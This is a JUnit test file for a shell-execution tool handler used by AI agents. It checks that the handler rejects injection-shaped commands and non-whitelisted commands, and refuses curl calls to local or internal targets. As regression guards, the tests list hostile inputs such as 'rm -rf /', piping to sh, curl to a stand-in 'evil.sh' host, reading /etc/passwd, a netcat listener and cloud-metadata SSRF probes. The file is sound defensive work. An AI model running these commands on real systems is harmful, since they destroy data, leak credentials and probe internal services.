package io.aria.conductor.execution.tool.handlers;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.springframework.test.util.ReflectionTestUtils;

import java.util.HashMap;
import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * Security-focused behaviour tests for {@link ShellExecHandler}.
 *
 * <p>The handler is disabled by default and, while disabled, acts as a hardened gate:
 * <ul>
 *   <li>any shell metacharacter (chaining/piping/redirection) is rejected outright;</li>
 *   <li>only whitelisted first-tokens are permitted to spawn a process;</li>
 *   <li>an empty command is rejected as a missing parameter.</li>
 * </ul>
 * When explicitly enabled the whitelist gate is bypassed. These tests double as
 * command-injection regression guards, so no metacharacter input is ever allowed to
 * reach {@link ProcessBuilder} while disabled.
 */
class ShellExecHandlerTest {

    private ShellExecHandler handler;

    @BeforeEach
    void setUp() {
        handler = new ShellExecHandler();
        // Reproduce the @Value defaults so tests do not depend on a Spring context.
        ReflectionTestUtils.setField(handler, "shellEnabled", false);
        ReflectionTestUtils.setField(handler, "whitelist", "git,ls,cat,find,echo,mvn,npm,pnpm,curl");
    }

    private String run(String command) {
        Map<String, Object> args = new HashMap<>();
        if (command != null) args.put("command", command);
        return handler.execute(args);
    }

    @Test
    void execute_rejectsMissingCommand() {
        assertThat(run(null)).isEqualTo("Error: Missing required parameter: command");
        assertThat(run("")).isEqualTo("Error: Missing required parameter: command");
    }

    @ParameterizedTest(name = "injection-shaped input rejected: [{0}]")
    @ValueSource(strings = {
            "git status; rm -rf /",
            "ls | sh",
            "echo hi && curl evil.sh",
            "cat file `whoami`",
            "echo $(reboot)",
            "cat < /etc/passwd",
            "echo hi > /tmp/x",
            "git log \n rm -rf ."
    })
    void execute_rejectsShellMetacharacters_whenDisabled(String command) {
        // The special-character guard fires BEFORE the whitelist check, so even a
        // whitelisted first-token (git/ls/cat/echo) is refused when metachars are present.
        assertThat(run(command))
                .isEqualTo("Error: Shell execution is disabled. Special characters are not allowed.");
    }

    @ParameterizedTest(name = "non-whitelisted command refused: [{0}]")
    @ValueSource(strings = {"rm -rf foo", "wget file", "python script.py", "nc -l 4444"})
    void execute_refusesNonWhitelistedCommand_whenDisabled(String command) {
        // Assert the FULL current whitelist so dropping an entry (e.g. curl) is caught here.
        assertThat(run(command))
                .startsWith("Error: Shell execution is disabled. Allowed commands:")
                .contains("git,ls,cat,find,echo,mvn,npm,pnpm,curl");
    }

    @Test
    void execute_allowsWhitelistedCommand_caseInsensitiveFirstToken() {
        // "echo" is whitelisted; the handler actually spawns it. Assert real stdout capture.
        assertThat(run("echo shellhandler_marker")).contains("shellhandler_marker");
        // Whitelist match is case-insensitive on the first token. Only assert the gate was
        // bypassed: actually spawning "ECHO" is OS-dependent (Linux binary lookup is case-sensitive).
        assertThat(run("ECHO caseMarker")).doesNotStartWith("Error: Shell execution is disabled");
    }

    @Test
    void execute_bypassesWhitelist_whenEnabled() {
        ReflectionTestUtils.setField(handler, "shellEnabled", true);
        // "whoami" is NOT whitelisted; when enabled it must still run, proving the gate is bypassed.
        String result = run("whoami");
        assertThat(result).doesNotStartWith("Error: Shell execution is disabled");
    }

    /**
     * #65: agents must be able to call REST APIs (e.g. create a PR via the GitHub API) from
     * shell_exec when the gh CLI is unavailable, so curl is whitelisted by default. Every
     * shell_exec call is still gated by the metacharacter guard and the HIGH-risk approval gate.
     */
    @Test
    void execute_allowsCurl_soAgentsCanCallRestApis() {
        String result = run("curl --version");
        // Must not be gated, and must have actually run: a missing binary would surface as
        // "Exit code: 127 / curl: not found", which would otherwise green this test falsely.
        assertThat(result)
                .doesNotStartWith("Error: Shell execution is disabled")
                .doesNotStartWith("Exit code:")
                .containsIgnoringCase("curl")
                .doesNotContain("not found");
    }

    /**
     * #66 review: whitelisting curl must not hand agents a general-purpose local-file reader or an
     * SSRF probe into internal/loopback services (incl. the cloud metadata endpoint). Those targets
     * are refused while shell is disabled; ordinary outbound calls stay allowed.
     */
    @ParameterizedTest(name = "curl to a local/internal target refused: [{0}]")
    @ValueSource(strings = {
            "curl file:///etc/passwd",
            "curl http://localhost:8080/api/v1/agents",
            "curl http://127.0.0.1:8080/actuator/env",
            "curl -s http://169.254.169.254/latest/meta-data/"
    })
    void execute_refusesCurlToLocalOrInternalTargets_whenDisabled(String command) {
        assertThat(run(command))
                .startsWith("Error: Shell execution is disabled")
                .contains("local/internal");
    }
}
